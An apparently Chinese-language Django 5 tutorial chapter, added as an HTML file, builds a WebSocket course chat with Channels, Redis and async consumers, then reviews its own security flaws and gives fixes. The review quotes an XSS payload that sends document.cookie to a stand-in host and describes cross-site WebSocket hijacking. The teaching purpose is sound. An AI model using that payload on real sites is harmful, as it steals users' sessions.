@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>第 16 章 · 聊天服务器 — Django 5 实战笔记</title>
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body data-chapter="16">
+<div id="app">
+<aside id="sidebar"></aside>
+<main>
+
+<span class="chapter-eyebrow">第 16 章 · 项目四：在线学习平台</span>
+<h1>聊天服务器</h1>
+<p class="lede">
+  给每门课程开一个实时聊天室：学生发出的消息要立刻出现在所有同学的屏幕上。
+  传统的“请求—响应”做不到服务器主动推送，这一章引入 <strong>ASGI</strong>、<strong>WebSocket</strong> 和 <strong>Django Channels</strong>，
+  用 Redis 做通道层实现广播，把消费者改成全异步，最后把消息存进数据库形成聊天记录。
+</p>
+
+<div class="goals">
+  <h4>本章目标</h4>
+  <ul>
+    <li>理解 WSGI 与 ASGI、HTTP 与 WebSocket 的区别</li>
+    <li>安装 Channels 与 Daphne，用 <code>ProtocolTypeRouter</code> 组织 ASGI 应用</li>
+    <li>编写 WebSocket 消费者（consumer）和路由</li>
+    <li>用 <code>json_script</code> 安全地把数据交给 JavaScript，编写 WebSocket 客户端</li>
+    <li>用 Redis 通道层和“组”实现广播；把消费者改写为异步</li>
+    <li>用异步 ORM（<code>acreate</code>）持久化消息并显示历史</li>
+  </ul>
+</div>
+
+<div id="chapter-toc"></div>
+
+<h2 id="why">为什么需要 WebSocket</h2>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 240" role="img" aria-label="HTTP 是一问一答，服务器不能主动发消息；WebSocket 建立一条持久的双向连接，双方随时可以发消息">
+  <rect class="bx-d" x="16" y="16" width="352" height="210" rx="12"/>
+  <text class="ttl" x="192" y="40" text-anchor="middle">HTTP：一问一答</text>
+  <text class="sm" x="40" y="64">浏览器</text><text class="sm" x="300" y="64">服务器</text>
+  <path class="ln" d="M60 80 H316" marker-end="url(#ar)"/><text class="sm" x="188" y="76" text-anchor="middle">请求</text>
+  <path class="ln" d="M316 100 H60" marker-end="url(#ar)"/><text class="sm" x="188" y="96" text-anchor="middle">响应，连接结束</text>
+  <path class="ln-d" d="M60 130 H316" marker-end="url(#ar)"/><text class="sm" x="188" y="126" text-anchor="middle">有新消息吗？（轮询）</text>
+  <path class="ln-d" d="M316 150 H60" marker-end="url(#ar)"/><text class="sm" x="188" y="146" text-anchor="middle">没有……</text>
+  <text class="sm on-r" x="32" y="186">服务器无法主动推送；轮询浪费资源又有延迟</text>
+  <text class="sm" x="32" y="208">Django 默认通过 WSGI 处理这种模式</text>
+
+  <rect class="bx-g" x="392" y="16" width="352" height="210" rx="12"/>
+  <text class="ttl on-g" x="568" y="40" text-anchor="middle">WebSocket：一条持久的双向通道</text>
+  <text class="sm" x="416" y="64">浏览器</text><text class="sm" x="676" y="64">服务器</text>
+  <path class="ln" d="M436 80 H692" marker-end="url(#ar)"/><text class="sm" x="564" y="76" text-anchor="middle">HTTP Upgrade 握手</text>
+  <rect class="bx-g" x="436" y="92" width="256" height="60" rx="8"/>
+  <text class="sm on-g" x="564" y="114" text-anchor="middle">连接保持打开</text>
+  <text class="sm" x="564" y="136" text-anchor="middle">⇄ 任何一方随时发送消息</text>
+  <text class="sm on-g" x="408" y="186">服务器可以立刻把新消息推给所有人</text>
+  <text class="sm" x="408" y="208">需要 ASGI 服务器（Daphne / Uvicorn）</text>
+</svg>
+<figcaption>图 16-1　长连接协议需要异步服务器接口 ASGI</figcaption>
+</figure>
+
+<h2 id="setup">聊天室页面与 Channels 安装</h2>
+
+<div class="code" data-lang="py" data-file="chat/views.py 与 chat/urls.py">
+<pre>
+@login_required
+def course_chat_room(request, course_id):
+    try:
+        course = request.user.courses_joined.get(id=course_id)   # 只能进自己选了的课
+    except Course.DoesNotExist:
+        return HttpResponseForbidden()
+    return render(request, 'chat/room.html', {'course': course})
+
+
+app_name = 'chat'
+urlpatterns = [path('room/&lt;int:course_id&gt;/', views.course_chat_room, name='course_chat_room')]
+</pre>
+</div>
+
+<div class="code" data-lang="bash">
+<pre>
+python -m pip install -U 'channels[daphne]==4.1.0'
+</pre>
+</div>
+
+<div class="code" data-lang="py" data-file="educa/settings.py">
+<pre>
+INSTALLED_APPS = [
+    'daphne',                      # 放在最前面：接管 runserver，使其支持 ASGI
+    # ...
+    'chat.apps.ChatConfig',
+]
+ASGI_APPLICATION = 'educa.asgi.application'
+</pre>
+</div>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 250" role="img" aria-label="ASGI 架构：Daphne 接收连接，ProtocolTypeRouter 按协议分流，HTTP 交给 Django，WebSocket 经过认证中间件和 URLRouter 到达 ChatConsumer">
+  <rect class="bx" x="16" y="95" width="110" height="60" rx="10"/>
+  <text class="ttl" x="71" y="121" text-anchor="middle">浏览器</text>
+  <text class="sm" x="71" y="141" text-anchor="middle">HTTP + WS</text>
+  <path class="ln" d="M128 125 H160" marker-end="url(#ar)"/>
+  <rect class="bx-p" x="164" y="95" width="110" height="60" rx="10"/>
+  <text class="ttl on-p" x="219" y="121" text-anchor="middle">Daphne</text>
+  <text class="sm" x="219" y="141" text-anchor="middle">ASGI 服务器</text>
+  <path class="ln" d="M276 125 H308" marker-end="url(#ar)"/>
+  <rect class="bx-d" x="312" y="85" width="160" height="80" rx="10"/>
+  <text class="mono sm" x="392" y="112" text-anchor="middle">ProtocolTypeRouter</text>
+  <text class="sm" x="392" y="134" text-anchor="middle">按协议类型分流</text>
+  <path class="ln-b" d="M474 105 L520 56" marker-end="url(#ar-b)"/>
+  <text class="mono sm on-b" x="480" y="70">'http'</text>
+  <rect class="bx-b" x="524" y="20" width="220" height="60" rx="10"/>
+  <text class="mono sm on-b" x="634" y="44" text-anchor="middle">get_asgi_application()</text>
+  <text class="sm" x="634" y="64" text-anchor="middle">普通 Django 视图，一切照旧</text>
+  <path class="ln-a" d="M474 145 L520 184" marker-end="url(#ar-a)"/>
+  <text class="mono sm on-a" x="470" y="186">'websocket'</text>
+  <rect class="bx-a" x="524" y="150" width="220" height="90" rx="10"/>
+  <text class="mono sm on-a" x="634" y="172" text-anchor="middle">AuthMiddlewareStack</text>
+  <text class="mono sm" x="634" y="192" text-anchor="middle">→ URLRouter</text>
+  <text class="mono sm" x="634" y="212" text-anchor="middle">→ ChatConsumer</text>
+  <text class="sm" x="634" y="230" text-anchor="middle">scope['user'] 来自会话</text>
+</svg>
+<figcaption>图 16-2　Channels 在 Django 原生 ASGI 支持之上增加了 WebSocket 等长连接协议的路由</figcaption>
+</figure>
+
+<div class="code" data-lang="py" data-file="educa/asgi.py">
+<pre>
+import os
+
+from channels.auth import AuthMiddlewareStack
+from channels.routing import ProtocolTypeRouter, URLRouter
+from django.core.asgi import get_asgi_application
+
+os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'educa.settings')
+django_asgi_app = get_asgi_application()     # 先初始化 Django（加载应用注册表）
+
+from chat.routing import websocket_urlpatterns   # 之后才能导入会用到模型的代码
+
+application = ProtocolTypeRouter({
+    'http': django_asgi_app,
+    'websocket': AuthMiddlewareStack(URLRouter(websocket_urlpatterns)),
+})
+</pre>
+</div>
+
+<h2 id="consumer">消费者与路由</h2>
+
+<p>消费者（consumer）之于 WebSocket，就像视图之于 HTTP。不同的是它是长寿的：一个连接从建立到断开，一直是同一个消费者实例在处理。</p>
+
+<div class="code" data-lang="py" data-file="chat/routing.py">
+<pre>
+from django.urls import re_path
+
+from . import consumers
+
+websocket_urlpatterns = [
+    re_path(r'ws/chat/room/(?P&lt;course_id&gt;\d+)/$', consumers.ChatConsumer.as_asgi()),
+]
+</pre>
+</div>
+
+<div class="box tip">
+  <div class="t">&#128161; 两个小约定</div>
+  <p>WebSocket 的 URL 以 <code>/ws/</code> 开头，方便生产环境的 Nginx 按路径把它们转给 Daphne；Channels 路由用 <code>re_path</code> 而不是 <code>path</code>，避免外层中间件包装时出现匹配问题。</p>
+</div>
+
+<h3>WebSocket 客户端</h3>
+
+<div class="code" data-lang="html" data-file="chat/templates/chat/room.html（节选）">
+<pre>
+{% block include_js %}
+  {{ course.id|json_script:"course-id" }}                  {# 安全地把 Python 值交给 JS #}
+  {{ request.user.username|json_script:"request-user" }}
+{% endblock %}
+
+{% block domready %}
+  const courseId = JSON.parse(document.getElementById('course-id').textContent);
+  const url = 'ws://' + window.location.host + '/ws/chat/room/' + courseId + '/';
+  const chatSocket = new WebSocket(url);
+
+  chatSocket.onmessage = function(event) {
+    const data = JSON.parse(event.data);
+    const chat = document.getElementById('chat');
+    chat.innerHTML += '&lt;div class="message"&gt;' + data.message + '&lt;/div&gt;';   {# 点评里会指出问题 #}
+    chat.scrollTop = chat.scrollHeight;
+  };
+
+  chatSocket.onclose = function(event) {
+    console.error('Chat socket closed unexpectedly');
+  };
+
+  submitButton.addEventListener('click', function() {
+    const message = input.value;
+    if (message) {
+      chatSocket.send(JSON.stringify({'message': message}));
+      input.value = '';
+      input.focus();
+    }
+  });
+{% endblock %}
+</pre>
+</div>
+
+<div class="box note">
+  <div class="t">&#9432; 为什么用 <code>json_script</code></div>
+  <p>直接写 <code>const name = '{{ request.user.username }}';</code> 看似可以，但用户名里一旦含有 <code>&lt;/script&gt;</code> 或引号，就能跳出字符串执行任意脚本。<code>json_script</code> 会把值编码成 JSON 并转义危险字符，放进一个 <code>type="application/json"</code> 的 script 标签里，是官方推荐的安全做法。</p>
+</div>
+
+<h2 id="channel-layer">通道层：让消费者互相通信</h2>
+
+<p>每个浏览器连接对应一个消费者实例。A 发的消息只到达 A 的消费者 —— 要让它到达 B、C、D，需要一个“中转站”：<strong>通道层</strong>。</p>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 290" role="img" aria-label="通道层与组：同一课程的三个连接各有一个消费者，都加入 chat_3 组；一个消费者 group_send 后，Redis 把事件分发给组内所有消费者，它们再各自推送给浏览器">
+  <rect class="bx" x="16" y="30" width="110" height="46" rx="8"/><text class="sm" x="71" y="58" text-anchor="middle">Alice 的浏览器</text>
+  <rect class="bx" x="16" y="120" width="110" height="46" rx="8"/><text class="sm" x="71" y="148" text-anchor="middle">Bob 的浏览器</text>
+  <rect class="bx" x="16" y="210" width="110" height="46" rx="8"/><text class="sm" x="71" y="238" text-anchor="middle">Eve 的浏览器</text>
+
+  <rect class="bx-a" x="170" y="30" width="150" height="46" rx="8"/><text class="mono sm on-a" x="245" y="58" text-anchor="middle">ChatConsumer #1</text>
+  <rect class="bx-a" x="170" y="120" width="150" height="46" rx="8"/><text class="mono sm on-a" x="245" y="148" text-anchor="middle">ChatConsumer #2</text>
+  <rect class="bx-a" x="170" y="210" width="150" height="46" rx="8"/><text class="mono sm on-a" x="245" y="238" text-anchor="middle">ChatConsumer #3</text>
+  <path class="ln-a" d="M128 48 H166" marker-end="url(#ar-a)"/>
+  <text class="sm on-a" x="147" y="42" text-anchor="middle">① 发</text>
+  <path class="ln" d="M166 150 H130" marker-end="url(#ar)"/>
+  <path class="ln" d="M166 240 H130" marker-end="url(#ar)"/>
+  <path class="ln" d="M166 62 H130" marker-end="url(#ar)"/>
+
+  <rect class="bx-p" x="400" y="40" width="344" height="210" rx="14"/>
+  <text class="ttl on-p" x="572" y="66" text-anchor="middle">通道层（Redis）</text>
+  <rect class="bx-d" x="424" y="84" width="296" height="100" rx="10"/>
+  <text class="mono sm" x="572" y="108" text-anchor="middle">group "chat_3"</text>
+  <text class="mono sm" x="572" y="130" text-anchor="middle">channel_1  channel_2  channel_3</text>
+  <text class="sm" x="572" y="156" text-anchor="middle">connect() 时 group_add</text>
+  <text class="sm" x="572" y="174" text-anchor="middle">disconnect() 时 group_discard</text>
+  <text class="mono sm" x="420" y="210">group_send(type='chat_message')</text>
+  <text class="sm" x="420" y="232">→ 组内每个消费者的 chat_message() 被调用</text>
+
+  <path class="ln-p" d="M322 50 L396 110" marker-end="url(#ar-p)"/>
+  <text class="sm on-p" x="344" y="70">② group_send</text>
+  <path class="ln-p" d="M398 150 H324" marker-end="url(#ar-p)"/>
+  <path class="ln-p" d="M398 170 L324 236" marker-end="url(#ar-p)"/>
+  <path class="ln-p" d="M398 130 L324 62" marker-end="url(#ar-p)"/>
+  <text class="sm on-p" x="344" y="210">③ 分发</text>
+</svg>
+<figcaption>图 16-3　组（group）= 一组通道的名字；向组发送就是广播。多个服务器进程也能通过同一个 Redis 互通</figcaption>
+</figure>
+
+<div class="code" data-lang="bash">
+<pre>
+python -m pip install channels-redis==4.2.0
+docker run -it --rm --name redis -p 6379:6379 redis:7.2.4
+</pre>
+</div>
+
+<div class="code" data-lang="py" data-file="educa/settings.py">
+<pre>
+CHANNEL_LAYERS = {
+    'default': {
+        'BACKEND': 'channels_redis.core.RedisChannelLayer',
+        'CONFIG': {'hosts': [('127.0.0.1', 6379)]},
+    },
+}
+</pre>
+</div>
+
+<h3>异步消费者（最终版本）</h3>
+
+<div class="code" data-lang="py" data-file="chat/consumers.py">
+<pre>
+import json
+
+from channels.generic.websocket import AsyncWebsocketConsumer
+from django.utils import timezone
+
+from chat.models import Message
+
+
+class ChatConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        self.user = self.scope['user']                              # AuthMiddlewareStack 提供
+        self.id = self.scope['url_route']['kwargs']['course_id']    # 来自 URL
+        self.room_group_name = f'chat_{self.id}'
+        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
+        await self.accept()
+
+    async def disconnect(self, close_code):
+        await self.channel_layer.group_discard(self.room_group_name, self.channel_name)
+
+    async def persist_message(self, message):
+        await Message.objects.acreate(user=self.user, course_id=self.id, content=message)
+
+    async def receive(self, text_data):                              # 从浏览器收到
+        message = json.loads(text_data)['message']
+        now = timezone.now()
+        await self.channel_layer.group_send(self.room_group_name, {
+            'type': 'chat_message',                                  # 决定调用哪个方法
+            'message': message,
+            'user': self.user.username,
+            'datetime': now.isoformat(),
+        })
+        await self.persist_message(message)
+
+    async def chat_message(self, event):                             # 从组里收到
+        await self.send(text_data=json.dumps(event))
+</pre>
+</div>
+
+<figure>
+<svg class="dgm" viewBox="0 0 760 190" role="img" aria-label="同步消费者用线程执行，调用通道层需要 async_to_sync；异步消费者运行在事件循环中，I/O 时让出控制权，可同时处理大量连接">
+  <rect class="bx-d" x="16" y="20" width="352" height="150" rx="12"/>
+  <text class="ttl" x="192" y="44" text-anchor="middle">WebsocketConsumer（同步）</text>
+  <text class="sm" x="32" y="70">每个连接占用一个线程</text>
+  <text class="mono sm" x="32" y="94">async_to_sync(self.channel_layer.group_send)(…)</text>
+  <text class="sm" x="32" y="118">可以直接用普通 ORM</text>
+  <text class="sm on-r" x="32" y="146">连接一多，线程开销大</text>
+  <rect class="bx-g" x="392" y="20" width="352" height="150" rx="12"/>
+  <text class="ttl on-g" x="568" y="44" text-anchor="middle">AsyncWebsocketConsumer（异步）</text>
+  <text class="sm" x="408" y="70">async def + await，跑在事件循环里</text>
+  <text class="mono sm" x="408" y="94">await self.channel_layer.group_send(…)</text>
+  <text class="sm" x="408" y="118">ORM 用异步接口：acreate、aget、async for</text>
+  <text class="sm on-g" x="408" y="146">等待 I/O 时不阻塞，适合大量长连接</text>
+</svg>
+<figcaption>图 16-4　在异步代码里调用同步 ORM 会触发 <code>SynchronousOnlyOperation</code>，要么用异步 ORM 方法，要么用 <code>database_sync_to_async</code> 包装</figcaption>
+</figure>
+
+<h2 id="persist">持久化消息与聊天记录</h2>
+
+<div class="code" data-lang="py" data-file="chat/models.py">
+<pre>
+class Message(models.Model):
+    user = models.ForeignKey(settings.AUTH_USER_MODEL, on_delete=models.PROTECT,
+                             related_name='chat_messages')
+    course = models.ForeignKey('courses.Course', on_delete=models.PROTECT,
+                               related_name='chat_messages')
+    content = models.TextField()
+    sent_on = models.DateTimeField(auto_now_add=True)
+</pre>
+</div>
+
+<div class="code" data-lang="py" data-file="chat/views.py（进入聊天室时显示最近 5 条）">
+<pre>
+latest_messages = course.chat_messages.select_related('user').order_by('-id')[:5]
+latest_messages = reversed(latest_messages)       # ORM 不支持负索引：先倒序取 5 条，再翻转回来
+return render(request, 'chat/room.html', {'course': course, 'latest_messages': latest_messages})
+</pre>
+</div>
+
+<div class="box note">
+  <div class="t">&#9432; 书中的一个笔误</div>
+  <p>书中 <code>MessageAdmin</code> 写的是 <code>raw_id_fields = ['user', 'content']</code>，<code>content</code> 是文本字段，系统检查会报错。仓库代码已改正为 <code>['user', 'course']</code>。</p>
+</div>
+
+<h2 id="review">代码点评</h2>
+
+<div class="review">
+  <div class="h">&#128269; 第 16 章代码点评 <small>Chapter16/educa/chat</small></div>
+
+  <div class="item">
+    <h4><span class="tag good">做得好</span> 异步消费者 + 异步 ORM + json_script</h4>
+    <p>最终版本完全异步，通道层调用和数据库写入都用 <code>await</code>；页面向 JS 传值用 <code>json_script</code>；历史消息查询用了 <code>select_related('user')</code>；ASGI 入口里先 <code>get_asgi_application()</code> 再导入路由的顺序也正确。</p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag bad">有问题</span> 实时消息通过 innerHTML 插入 —— 存储型 XSS <span class="src">Chapter16/educa/chat/templates/chat/room.html</span></h4>
+    <p>
+      历史消息由 Django 模板渲染（自动转义），但新消息在 JavaScript 里用 <code>innerHTML += … + data.message</code> 直接拼接。
+      任何同学发送 <code>&lt;img src=x onerror="fetch('//evil/?c='+document.cookie)"&gt;</code>，所有在线的人浏览器里都会执行它。
+      书中提到可以用 nh3 在入库前清洗，但前端的问题更直接：<strong>不要把不可信文本当 HTML 插入</strong>。
+    </p>
+<div class="code" data-lang="js"><pre>
+chatSocket.onmessage = function(event) {
+  const data = JSON.parse(event.data);
+  const div = document.createElement('div');
+  div.className = 'message ' + (data.user === requestUser ? 'me' : 'other');
+  const strong = document.createElement('strong');
+  strong.textContent = data.user === requestUser ? 'Me' : data.user;   // textContent 不解析 HTML
+  const text = document.createElement('p');
+  text.textContent = data.message;
+  div.append(strong, text);
+  chat.appendChild(div);
+  chat.scrollTop = chat.scrollHeight;
+};
+</pre></div>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag bad">有问题</span> WebSocket 连接没有做任何授权 <span class="src">chat/consumers.py:10</span></h4>
+    <p>
+      HTTP 视图检查了“必须登录且选了这门课”，但消费者的 <code>connect()</code> 无条件 <code>accept()</code>。
+      任何人只要知道 <code>/ws/chat/room/3/</code> 就能连上、偷听所有消息；未登录用户发消息时 <code>self.user</code> 是 <code>AnonymousUser</code>，<code>acreate</code> 失败导致连接异常断开。
+      WebSocket 端点必须和 HTTP 端点做同样的权限检查：
+    </p>
+<div class="code" data-lang="py"><pre>
+from channels.db import database_sync_to_async
+
+
+class ChatConsumer(AsyncWebsocketConsumer):
+    async def connect(self):
+        self.user = self.scope['user']
+        self.id = int(self.scope['url_route']['kwargs']['course_id'])
+        if not self.user.is_authenticated or not await self.is_enrolled():
+            await self.close(code=4403)
+            return
+        self.room_group_name = f'chat_{self.id}'
+        await self.channel_layer.group_add(self.room_group_name, self.channel_name)
+        await self.accept()
+
+    async def is_enrolled(self):
+        return await self.user.courses_joined.filter(id=self.id).aexists()
+</pre></div>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag bad">有问题</span> 缺少 Origin 校验：跨站 WebSocket 劫持</h4>
+    <p>
+      浏览器发起 WebSocket 时会自动带上 Cookie，而 WebSocket <strong>不受 CSRF 中间件保护</strong>。恶意网站可以用受害者的登录态连接你的聊天室。
+      Channels 文档要求用 <code>AllowedHostsOriginValidator</code> 包装 WebSocket 应用，只接受 <code>ALLOWED_HOSTS</code> 中的来源：
+    </p>
+<div class="code" data-lang="py" data-file="educa/asgi.py"><pre>
+from channels.security.websocket import AllowedHostsOriginValidator
+
+application = ProtocolTypeRouter({
+    'http': django_asgi_app,
+    'websocket': AllowedHostsOriginValidator(
+        AuthMiddlewareStack(URLRouter(websocket_urlpatterns))
+    ),
+})
+</pre></div>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag warn">建议改进</span> 输入校验与协议细节</h4>
+    <p>
+      ① <code>json.loads(text_data)['message']</code> 遇到非 JSON 或缺少键就抛异常，连接被断开；没有长度限制，一条 10 MB 的消息会被广播并写库 —— 应校验类型、去空白、限制长度（比如 1000 字符），还可以按用户限速。
+      ② 客户端写死了 <code>ws://</code>，网站一上 HTTPS（第 17 章），浏览器会因“混合内容”拒绝连接，应写成 <code>(location.protocol === 'https:' ? 'wss://' : 'ws://')</code>。
+      ③ 断线后没有自动重连，可以在 <code>onclose</code> 里做指数退避重连。
+    </p>
+  </div>
+
+  <div class="item">
+    <h4><span class="tag info">补充知识</span> 数据模型的取舍</h4>
+    <p>
+      <code>on_delete=models.PROTECT</code> 保护了聊天记录，但也意味着发过言的用户无法被删除 —— 面对“注销账号/被遗忘权”的需求时，可以改成 <code>SET_NULL</code> 并显示“已注销用户”。
+      历史查询按课程取最新消息，数据量大时应加索引：<code>models.Index(fields=['course', '-sent_on'])</code>。
+      另外，先广播后入库意味着入库失败时大家看到了一条“不存在”的消息，对聊天场景通常可以接受，对订单、支付等场景则应先落库再通知。
+    </p>
+  </div>
+</div>
+
+<h2 id="summary">小结</h2>
+
+<ul>
+  <li>WebSocket 提供持久的双向连接，需要 ASGI 服务器（Daphne）。</li>
+  <li><code>ProtocolTypeRouter</code> 按协议分流；<code>AuthMiddlewareStack</code> 把会话中的用户放进 <code>scope</code>。</li>
+  <li>消费者处理 connect / receive / disconnect；通道层的“组”实现广播。</li>
+  <li>异步消费者配合异步 ORM（<code>acreate</code> 等）才能真正不阻塞。</li>
+  <li>WebSocket 端点同样需要认证、授权、Origin 校验和输入校验；前端插入内容用 <code>textContent</code>。</li>
+</ul>
+
+<div class="exercise">
+  <h3>动手练习</h3>
+  <ol>
+    <li>发送一条 <code>&lt;b&gt;hi&lt;/b&gt;</code>，观察是否被渲染为粗体；按点评改为 <code>textContent</code> 后再试。</li>
+    <li>用一个没有选课的账号，在浏览器控制台里 <code>new WebSocket('ws://…/ws/chat/room/1/')</code>，确认修复前能连接、修复后被拒绝。</li>
+    <li>在 <code>asgi.py</code> 中加入 <code>AllowedHostsOriginValidator</code>。</li>
+    <li>选做：给聊天室加“正在输入…”提示（提示：发送另一种 <code>type</code> 的组消息）。</li>
+  </ol>
+</div>
+
+<div id="pager"></div>
+</main>
+</div>
+<script src="assets/site.js"></script>
+</body>
+</html>
